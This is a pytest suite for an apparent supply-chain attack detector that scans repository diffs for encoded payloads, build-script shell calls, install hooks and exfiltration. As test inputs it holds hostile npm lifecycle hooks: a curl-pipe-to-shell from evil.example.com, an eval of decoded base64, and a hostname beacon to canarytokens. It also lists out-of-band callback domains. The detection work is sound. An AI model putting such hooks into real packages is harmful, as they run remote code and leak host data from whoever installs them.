"""rules.py — Tier 0 detection. Pure functions over dataclasses, no I/O, no network.

Tests are grouped by what they protect:
  * helpers      — diff parsing and path classification, where off-by-one errors hide
  * content      — each payload pattern, including the severity it carries and where
  * context      — circumstance rules, and that pushes never get PR-only findings
  * combos       — co-occurrence scoring
  * scoring      — dedup, and the evidence/circumstance split that escalation depends on
  * regressions  — false positives measured against the real control corpus
"""

from __future__ import annotations

import pytest

from kitsunox import rules
from pathlib import Path

from kitsunox.model import Change, FileDiff, Finding

B64 = "A" * 220  # over the 200-char floor, well past a sha512 integrity field


def _file(
    path: str,
    patch: str = "",
    *,
    change_type: str = "modified",
    is_binary: bool = False,
) -> FileDiff:
    return FileDiff(path=path, change_type=change_type, is_binary=is_binary, patch=patch)


def _added(*lines: str, start: int = 1) -> str:
    """A minimal unified-diff hunk consisting only of added lines."""
    return f"@@ -{start},0 +{start},{len(lines)} @@\n" + "\n".join("+" + ln for ln in lines)


def _change(files: list[FileDiff], **kw) -> Change:
    defaults = dict(repo="o/r", source="push", sha="abc", author="alice", committed_at=None)
    defaults.update(kw)
    return Change(files=files, **defaults)


def _ids(findings) -> set[str]:
    return {f.rule_id for f in findings}


def _scan_ids(files: list[FileDiff], **kw) -> set[str]:
    return _ids(rules.scan(_change(files, **kw)))


def _sev(findings, rule_id: str) -> str:
    return next(f.severity for f in findings if f.rule_id == rule_id)


# ============================================================== helpers: diff parsing


def test_added_lines_numbers_against_the_new_file():
    patch = "@@ -10,3 +10,4 @@\n unchanged\n+inserted\n unchanged2"
    assert list(rules._added_lines(_file("f.py", patch))) == [(11, "inserted")]


def test_added_lines_ignores_removals_and_does_not_count_them():
    # A removed line occupies no position in the new file, so the following addition
    # must not be pushed down by it.
    patch = "@@ -1,3 +1,2 @@\n keep\n-gone\n+added"
    assert list(rules._added_lines(_file("f.py", patch))) == [(2, "added")]


def test_added_lines_restarts_numbering_at_each_hunk():
    patch = "@@ -1,1 +1,2 @@\n ctx\n+first\n@@ -50,1 +80,2 @@\n ctx\n+second"
    assert list(rules._added_lines(_file("f.py", patch))) == [(2, "first"), (81, "second")]


def test_added_lines_does_not_mistake_the_file_header_for_an_addition():
    patch = "+++ b/f.py\n@@ -1,0 +1,1 @@\n+real"
    assert [t for _, t in rules._added_lines(_file("f.py", patch))] == ["real"]


def test_added_lines_on_empty_patch_yields_nothing():
    assert list(rules._added_lines(_file("f.py", ""))) == []


# ============================================================== helpers: classification


@pytest.mark.parametrize(
    "path,expected",
    [
        (".github/workflows/ci.yml", True),
        (".github/actions/setup/action.yml", True),
        (".gitlab-ci.yml", True),
        ("src/github/workflows.py", False),
    ],
)
def test_is_ci(path, expected):
    assert rules._is_ci(path) is expected


@pytest.mark.parametrize(
    "path,expected",
    [
        ("install.sh", True),
        ("Makefile", True),
        ("MAKEFILE", True),  # case-insensitive
        ("configure.ac", True),
        ("m4/build-to-host.m4", True),
        ("scripts/release.sh", True),
        ("src/install.py", False),
    ],
)
def test_is_build_script(path, expected):
    assert rules._is_build_script(path) is expected


@pytest.mark.parametrize(
    "path,expected",
    [("dist/index.js", True), ("build/out.js", True), ("app.min.js", True), ("src/index.js", False)],
)
def test_is_artifact(path, expected):
    assert rules._is_artifact(path) is expected


@pytest.mark.parametrize(
    "path,expected",
    [("tests/files/x.xz", True), ("test/fixtures/a.bin", True), ("src/main.c", False)],
)
def test_is_test_fixture(path, expected):
    assert rules._is_test_fixture(path) is expected


def test_scannable_rejects_binary_lockfiles_and_empty_patches():
    assert rules._scannable(_file("a.js", _added("x")))
    assert not rules._scannable(_file("a.bin", _added("x"), is_binary=True))
    assert not rules._scannable(_file("package-lock.json", _added("x")))
    assert not rules._scannable(_file("a.js", ""))


def test_evidence_is_truncated_and_stripped():
    assert rules._evidence("   hi   ") == "hi"
    long = rules._evidence("x" * 500)
    assert len(long) == rules.EVIDENCE_MAX_CHARS + 3 and long.endswith("...")


# ============================================================== helpers: host matching


@pytest.mark.parametrize(
    "text",
    [
        "url = 'http://127.0.0.1:8080'",
        "server.listen(0, '10.0.0.5')",
        "proxy = '192.168.1.1'",
        "host = '172.16.0.1'",
        "link_local = '169.254.1.1'",
        "bind = '0.0.0.0'",
    ],
)
def test_private_and_loopback_addresses_are_not_suspicious(text):
    # axios added 20+ `127.0.0.1` lines in one proxy-test PR. None can reach an attacker.
    assert rules._hits_suspicious_host(text) is False


@pytest.mark.parametrize(
    "text",
    [
        '  "version": "==3.4.0.3"',
        "package>=1.2.3.4",
        "tag = v1.10.0.2",
    ],
)
def test_four_part_version_numbers_are_not_mistaken_for_ips(text):
    # psf/requests' Pipfile.lock produced the only false positive in the direct-push
    # control sample this way: 3.4.0.3 is a perfectly valid IP by shape.
    assert rules._hits_suspicious_host(text) is False


def test_lockfiles_are_not_scanned_for_content():
    assert not rules._scannable(_file("Pipfile.lock", _added('"version": "==3.4.0.3"')))
    assert not rules._scannable(_file("npm-shrinkwrap.json", _added("x")))


@pytest.mark.parametrize(
    "text",
    [
        "curl https://gist.githubusercontent.com/x/y",
        "fetch('https://pastebin.com/raw/abc')",
        "post('http://8.8.8.8/collect')",
        "tunnel = 'https://abc.ngrok.io'",
    ],
)
def test_routable_hosts_and_paste_services_are_suspicious(text):
    assert rules._hits_suspicious_host(text) is True


# ============================================================== content rules


def test_encoded_blob_fires_and_is_elevated_in_sensitive_paths():
    normal = rules.scan(_change([_file("src/a.js", _added(f'const x = "{B64}";'))]))
    assert _sev(normal, "content.encoded_blob") == "medium"

    in_script = rules.scan(_change([_file("install.sh", _added(f'X="{B64}"'))]))
    assert _sev(in_script, "content.encoded_blob") == "high"


def test_encoded_blob_ignores_lockfile_integrity_hashes():
    # package-lock.json is wall-to-wall base64 `integrity` fields.
    assert "content.encoded_blob" not in _scan_ids(
        [_file("package-lock.json", _added(f'"integrity": "sha512-{B64}"'))]
    )


def test_shell_exec_is_not_elevated_inside_ci_config():
    # A workflow's entire job is to run shell, so `child_process` there is unremarkable —
    # this is what escalated expressjs/express#7465 and #7464 as false positives.
    in_ci = rules.scan(
        _change([_file(".github/workflows/publish.yml", _added("require('child_process')"))])
    )
    assert _sev(in_ci, "content.shell_exec") == "low"

    in_build = rules.scan(_change([_file("install.sh", _added("execSync('x')"))]))
    assert _sev(in_build, "content.shell_exec") == "high"


def test_decode_call_and_secret_access_fire():
    ids = _scan_ids([_file("a.js", _added("atob(payload)", "read('/proc/self/mem')"))])
    assert {"content.decode_call", "content.secret_access"} <= ids


def test_unbounded_loop_fires_high():
    # colors.js emits no other signal at all, and this measured 0/45 on benign PRs.
    found = rules.scan(_change([_file("lib/index.js", _added("for (let i = 666; i < Infinity; i++;) {"))]))
    assert _sev(found, "content.unbounded_loop") == "high"
    assert rules.should_escalate(found)


def test_while_true_also_counts_as_unbounded():
    assert "content.unbounded_loop" in _scan_ids([_file("a.js", _added("while (true) {"))])


def test_network_fetch_only_fires_inside_build_context():
    assert "content.network_in_build" not in _scan_ids([_file("src/a.js", _added("fetch('https://x.dev')"))])
    assert "content.network_in_build" in _scan_ids([_file("install.sh", _added("curl https://x.dev"))])


def test_dependency_added_only_fires_on_manifests():
    dep = '  "flatmap-stream": "^0.1.0",'
    assert "content.dependency_added" in _scan_ids([_file("package.json", _added(dep))])
    assert "content.dependency_added" not in _scan_ids([_file("src/config.json", _added(dep))])


def test_binary_added_is_content_and_elevated_under_fixture_paths():
    # xz's only signal. It must be evidence, not circumstance, or xz stops escalating.
    fixture = rules.scan(
        _change([_file("tests/files/bad.xz", change_type="added", is_binary=True)])
    )
    assert _sev(fixture, "content.binary_added") == "high"
    assert rules.should_escalate(fixture)

    elsewhere = rules.scan(_change([_file("assets/logo.png", change_type="added", is_binary=True)]))
    assert _sev(elsewhere, "content.binary_added") == "medium"


def test_binary_that_was_modified_not_added_does_not_fire():
    assert "content.binary_added" not in _scan_ids(
        [_file("tests/files/bad.xz", change_type="modified", is_binary=True)]
    )


# ============================================================== context rules


def test_path_context_rules_fire():
    ids = _scan_ids(
        [
            _file(".github/workflows/ci.yml", _added("x")),
            _file("Makefile", _added("y")),
            _file("dist/index.js", _added("z")),
        ]
    )
    assert {
        "context.ci_touched",
        "context.build_script_touched",
        "context.artifact_modified",
    } <= ids


def test_self_merge_and_missing_approvals_fire_on_prs():
    ids = _scan_ids(
        [_file("a.js", _added("x"))],
        source="pr",
        author="alice",
        merged_by="alice",
        approving_review_count=0,
    )
    assert {"context.self_merged", "context.no_approvals"} <= ids


def test_pr_only_rules_never_fire_on_a_push():
    # A push has no reviewer to bypass; firing here would flag every direct commit.
    ids = _scan_ids([_file("a.js", _added("x"))], source="push", author="alice", merged_by="alice")
    assert "context.self_merged" not in ids
    assert "context.no_approvals" not in ids


def test_newcomer_touching_build_files_fires_only_for_newcomers():
    kw = dict(source="pr", approving_review_count=1, author="bob", merged_by="carol")
    files = [_file(".github/workflows/ci.yml", _added("x"))]
    assert "context.newcomer_touches_build" in _scan_ids(
        files, author_association="FIRST_TIME_CONTRIBUTOR", **kw
    )
    assert "context.newcomer_touches_build" not in _scan_ids(files, author_association="OWNER", **kw)


def test_newcomer_rule_needs_a_build_or_ci_file():
    assert "context.newcomer_touches_build" not in _scan_ids(
        [_file("README.md", _added("docs"))],
        source="pr",
        author_association="FIRST_TIME_CONTRIBUTOR",
        approving_review_count=1,
        author="bob",
        merged_by="carol",
    )


@pytest.mark.parametrize("checks,expected", [(False, True), (True, False), (None, False)])
def test_failing_checks_rule_distinguishes_false_from_unknown(checks, expected):
    ids = _scan_ids([_file("a.js", _added("x"))], checks_passed=checks)
    assert ("context.merged_with_failing_checks" in ids) is expected


# ============================================================== combination rules


def test_encoded_payload_in_build_script_combo():
    # The reviewdog compromise in miniature.
    ids = _scan_ids([_file("install.sh", _added(f'SCRIPT="{B64}"'))])
    assert "combo.encoded_payload_in_build_script" in ids


def test_encoded_payload_in_artifact_and_executed_combos():
    # The tj-actions shape: a blob plus a shell primitive in a generated bundle.
    ids = _scan_ids([_file("dist/index.js", _added(f'const b="{B64}";', "exec.getExecOutput('bash')"))])
    assert {"combo.encoded_payload_in_artifact", "combo.encoded_payload_executed"} <= ids


def test_credential_exfiltration_combo():
    ids = _scan_ids(
        [_file("a.js", _added("process.env)", "post('https://gist.githubusercontent.com/x')"))]
    )
    assert "combo.credential_exfiltration" in ids


def test_combo_does_not_fire_when_only_one_half_is_present():
    assert "combo.encoded_payload_in_build_script" not in _scan_ids(
        [_file("install.sh", _added("echo hello"))]
    )
    assert "combo.encoded_payload_in_build_script" not in _scan_ids(
        [_file("src/a.js", _added(f'const x = "{B64}";'))]
    )


def test_combo_inherits_location_from_its_anchor_finding():
    findings = rules.scan(_change([_file("install.sh", _added(f'X="{B64}"'))]))
    combo = next(f for f in findings if f.rule_id == "combo.encoded_payload_in_build_script")
    assert combo.file_path == "install.sh" and combo.line is not None and combo.evidence


# ============================================================== scoring


def test_repeated_hits_of_one_rule_score_once():
    # A minified bundle can trip one pattern hundreds of times; unchecked, that single
    # noisy file would outweigh a genuine combination of independent signals.
    many = rules.scan(_change([_file("src/a.js", _added(*[f'var x{i} = "{B64}";' for i in range(40)]))]))
    assert len([f for f in many if f.rule_id == "content.encoded_blob"]) == 40
    one = rules.scan(_change([_file("src/a.js", _added(f'var x = "{B64}";'))]))
    assert rules.score(many) == rules.score(one)


def test_evidence_score_excludes_circumstance_but_total_score_includes_it():
    findings = rules.scan(
        _change(
            [_file(".github/workflows/ci.yml", _added("x"))],
            source="pr",
            author="alice",
            merged_by="alice",
            approving_review_count=0,
        )
    )
    assert rules.evidence_score(findings) == 0
    assert rules.score(findings) > 0


def test_circumstance_alone_never_escalates():
    # psf/requests#6968: a Makefile tweak, touching a workflow, merged by its own author.
    # Three circumstance rules stacked past the threshold with zero payload evidence.
    findings = rules.scan(
        _change(
            [_file("Makefile", _added("clean:")), _file(".github/workflows/publish.yml", _added("on: push"))],
            source="pr",
            author="alice",
            merged_by="alice",
            approving_review_count=0,
            checks_passed=False,
        )
    )
    assert rules.score(findings) >= rules.ESCALATION_THRESHOLD  # would have escalated before
    assert rules.evidence_score(findings) == 0
    assert not rules.should_escalate(findings)


def test_a_single_high_evidence_finding_escalates():
    assert rules.SEVERITY_WEIGHT["high"] >= rules.ESCALATION_THRESHOLD


def test_empty_change_scores_zero_and_does_not_escalate():
    findings = rules.scan(_change([]))
    assert findings == [] and rules.score(findings) == 0
    assert not rules.should_escalate(findings)


def test_every_finding_carries_a_rationale_and_bounded_evidence():
    findings = rules.scan(
        _change(
            [_file("install.sh", _added(f'X="{B64}"', "curl https://gist.githubusercontent.com/x"))],
            source="pr",
            author="alice",
            merged_by="alice",
        )
    )
    assert findings
    for f in findings:
        assert f.rationale.strip(), f.rule_id
        assert len(f.evidence) <= rules.EVIDENCE_MAX_CHARS + 3, f.rule_id


def test_severity_weights_cover_every_severity_a_rule_can_emit():
    findings = rules.scan(
        _change(
            [
                _file("install.sh", _added(f'X="{B64}"', "execSync('x')")),
                _file("tests/files/b.xz", change_type="added", is_binary=True),
            ],
            source="pr",
            author="alice",
            merged_by="alice",
            approving_review_count=0,
        )
    )
    assert {f.severity for f in findings} <= set(rules.SEVERITY_WEIGHT)


# ============================================================== corpus regressions

# Each of these is a real diff line from the 45-PR control corpus that produced a false
# positive before the rules were corrected. They stay as tests so a future rule change
# that reintroduces the noise fails here rather than in a re-measured FP rate.


def test_regression_axios_proxy_tests_do_not_escalate():
    lines = [
        "await new Promise(function (resolve) { server.listen(0, '127.0.0.1', resolve); });",
        "var url = 'http://127.0.0.1:' + origin.address().port;",
        "proxyEnv: { HTTP_PROXY: 'http://127.0.0.1:1' },",
        "var expected = Buffer.from(encoded, 'base64');",
    ]
    findings = rules.scan(
        _change(
            [_file("test/unit/adapters/bodyLength.js", _added(*lines))],
            source="pr",
            author="alice",
            merged_by="alice",
            approving_review_count=0,
        )
    )
    assert "content.suspicious_host" not in _ids(findings)
    assert not rules.should_escalate(findings)


# ============================================================== author tenure (AV-800)


def test_new_contributor_is_recorded_but_carries_no_weight():
    # 56% of benign PR authors are under the threshold. If this scored, everything would.
    findings = rules.scan(_change([_file("a.js", _added("x"))], source="pr", author_tenure_days=0))
    assert _sev(findings, "context.new_contributor") == "info"
    assert rules.SEVERITY_WEIGHT["info"] == 0


def test_new_maintainer_direct_push_needs_both_push_and_short_tenure():
    kw = dict(author_tenure_days=4, author_prior_commits=9)
    assert "context.new_maintainer_direct_push" in _scan_ids(
        [_file("a.js", _added("x"))], source="push", **kw
    )
    # The same author going through review is ordinary open-source contribution.
    assert "context.new_maintainer_direct_push" not in _scan_ids(
        [_file("a.js", _added("x"))], source="pr", **kw
    )


def test_established_maintainer_pushing_directly_does_not_fire():
    # xz's attacker: 756 days and 431 commits in. No tenure threshold can catch the long
    # con, and pretending otherwise would flag every maintainer's routine commit.
    assert "context.new_maintainer_direct_push" not in _scan_ids(
        [_file("a.js", _added("x"))],
        source="push",
        author_tenure_days=756,
        author_prior_commits=431,
    )


def test_prolific_author_within_the_window_is_still_not_new():
    # Short tenure but many commits means a burst of legitimate activity, not a handover.
    assert "context.new_maintainer_direct_push" not in _scan_ids(
        [_file("a.js", _added("x"))],
        source="push",
        author_tenure_days=10,
        author_prior_commits=400,
    )


def test_missing_tenure_fires_nothing():
    # Unknown must never be treated as new — tj-actions and reviewdog have no history.
    ids = _scan_ids([_file("a.js", _added("x"))], source="push", author_tenure_days=None)
    assert "context.new_contributor" not in ids
    assert "context.new_maintainer_direct_push" not in ids


def test_event_stream_combo_escalates_where_neither_half_would():
    # The whole point: a legitimate-looking feature commit whose only trace is a new
    # dependency, pushed by someone who arrived days earlier.
    files = [_file("package.json", _added('  "flatmap-stream": "^0.1.0",'))]
    findings = rules.scan(
        _change(files, source="push", author_tenure_days=4, author_prior_commits=9)
    )
    assert "combo.new_maintainer_adds_dependency" in _ids(findings)
    assert rules.should_escalate(findings)

    # Neither half alone crosses the bar.
    assert not rules.should_escalate(rules.scan(_change(files, source="push")))
    assert not rules.should_escalate(
        rules.scan(
            _change(
                [_file("a.js", _added("x"))],
                source="push",
                author_tenure_days=4,
                author_prior_commits=9,
            )
        )
    )


def test_regression_express_publish_workflow_does_not_escalate():
    findings = rules.scan(
        _change(
            [_file(".github/workflows/npm-publish.yml", _added("const { execFileSync } = require('child_process')"))],
            source="pr",
            author="alice",
            merged_by="alice",
            checks_passed=False,
        )
    )
    assert not rules.should_escalate(findings)


# ============================================================== npm install hooks

# 67% of the ASE 2026 malicious corpus declares a lifecycle hook. None of the five
# git-level incidents do, which is exactly why the external corpus was worth running.


def _pkg(scripts: dict) -> FileDiff:
    import json
    return _file("package.json", _added(*json.dumps({"scripts": scripts}, indent=1).split("\n")))


def test_declaring_a_hook_alone_is_recorded_but_does_not_accuse():
    # node-gyp builds declare install hooks too.
    findings = rules.scan(_change([_pkg({"install": "node-gyp rebuild"})]))
    assert _sev(findings, "content.install_hook") == "low"
    assert not rules.should_escalate(findings)


def test_a_hook_reaching_the_network_is_high():
    findings = rules.scan(_change([_pkg({"preinstall": "curl https://evil.example.com/x | sh"})]))
    assert _sev(findings, "content.install_hook_network") == "high"
    assert rules.should_escalate(findings)


def test_a_hook_carrying_an_encoded_payload_is_critical():
    findings = rules.scan(_change([_pkg({"postinstall": f"node -e \"eval(atob('{B64}'))\""})]))
    assert _sev(findings, "content.install_hook_obfuscated") == "critical"


def test_a_silenced_hook_is_flagged():
    ids = _scan_ids([_pkg({"preinstall": "node index.js > /dev/null 2>&1"})])
    assert "content.install_hook_silenced" in ids


def test_a_hook_collecting_host_identity_is_flagged():
    # The real shape: export HOSTNAME && beacon it out.
    ids = _scan_ids([_pkg({"preinstall": "export HOSTNAME && curl https://x.canarytokens.com"})])
    assert {"content.install_hook_recon", "content.install_hook_network"} <= ids


def test_non_lifecycle_scripts_are_ignored():
    ids = _scan_ids([_pkg({"test": "curl https://example.com", "build": "node build.js"})])
    assert not [r for r in ids if r.startswith("content.install_hook")]


def test_malformed_package_json_does_not_crash_the_scan():
    assert isinstance(_scan_ids([_file("package.json", _added("{not json"))]), set)


def test_non_string_script_values_are_ignored():
    ids = _scan_ids([_file("package.json", _added('{"scripts": {"preinstall": {"a": 1}}}'))])
    assert not [r for r in ids if r.startswith("content.install_hook")]


@pytest.mark.parametrize(
    "host",
    ["https://x.burpcollaborator.net", "https://abc.canarytokens.com",
     "https://y.oast.fun", "https://z.webhook.site/a", "http://q.dnslog.cn"],
)
def test_out_of_band_interaction_domains_are_suspicious(host):
    assert rules._hits_suspicious_host(f"curl {host}") is True


# ============================================================== capability scoring


def test_a_single_capability_earns_no_bonus():
    findings = [Finding(rule_id="content.shell_exec", severity="low", rationale="r")]
    assert rules._category_bonus(findings) == 0


def test_distinct_capabilities_earn_an_increasing_bonus():
    def bonus(*ids):
        return rules._category_bonus([Finding(rule_id=i, severity="low", rationale="r") for i in ids])

    two = bonus("content.shell_exec", "content.suspicious_host")
    three = bonus("content.shell_exec", "content.suspicious_host", "content.encoded_blob")
    four = bonus("content.shell_exec", "content.suspicious_host", "content.encoded_blob",
                 "content.secret_access")
    assert 0 < two < three < four


def test_rules_in_the_same_capability_do_not_stack():
    def bonus(*ids):
        return rules._category_bonus([Finding(rule_id=i, severity="low", rationale="r") for i in ids])

    # Both are obfuscation; seeing two flavours of one capability is not an attack chain.
    assert bonus("content.encoded_blob", "content.decode_call") == 0


def test_delivery_alone_earns_nothing():
    # dependency_added fires on 93% of malicious packages AND 13% of benign changes.
    # Without this guard it would hand a free bonus to nearly everything in both corpora.
    findings = [Finding(rule_id="content.dependency_added", severity="low", rationale="r")]
    assert rules._category_bonus(findings) == 0


def test_the_bonus_is_capped():
    ids = [r for r in rules.RULE_CATEGORY]
    findings = [Finding(rule_id=i, severity="low", rationale="r") for i in ids]
    assert rules._category_bonus(findings) <= rules.MAX_CATEGORY_BONUS


def test_every_categorised_rule_id_is_one_a_rule_can_actually_emit():
    # A typo in RULE_CATEGORY would silently disable a capability rather than fail.
    import re
    source = (Path(rules.__file__)).read_text(encoding="utf-8")
    emitted = set(re.findall(r'"(content\.[a-z_]+)"', source))
    assert set(rules.RULE_CATEGORY) <= emitted


def test_context_findings_never_contribute_to_the_bonus():
    findings = [
        Finding(rule_id="context.ci_touched", severity="medium", rationale="r"),
        Finding(rule_id="context.self_merged", severity="medium", rationale="r"),
    ]
    assert rules._category_bonus(findings) == 0
